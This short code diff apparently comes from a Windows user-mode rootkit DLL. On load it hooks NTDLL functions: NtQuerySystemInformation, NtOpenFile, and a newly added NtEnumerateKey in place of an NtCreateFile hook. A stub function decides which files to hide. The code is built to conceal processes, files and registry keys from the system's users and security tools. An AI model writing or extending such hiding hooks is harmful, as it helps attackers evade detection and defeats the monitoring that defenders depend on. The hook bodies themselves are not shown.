@@ -3,6 +3,7 @@
 #include "hooking.h"
 
 #include "NtQuerySystemInformation.h"
+#include "NtEnumerateKey.h"
 
 BOOL mustHideFile(TCHAR filePath) {
     return FALSE; // TODO check la fin de la string avec des constantes
@@ -85,7 +86,7 @@ bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
 		case DLL_PROCESS_ATTACH:
 			hooking_addFunction("NtQuerySystemInformation", Hook("NTDLL.DLL", "NtQuerySystemInformation", NewNtQuerySystemInformation));
 			hooking_addFunction("NtOpenFile", Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile));
-			hooking_addFunction("NtCreateFile", Hook("NTDLL.DLL", "NtCreateFile", NewNtCreateFile));
+			hooking_addFunction("NtEnumerateKey", Hook("NTDLL.DLL", "NtEnumerateKey", NewNtEnumerateKey));
 			return TRUE;
 	}
 	return TRUE;
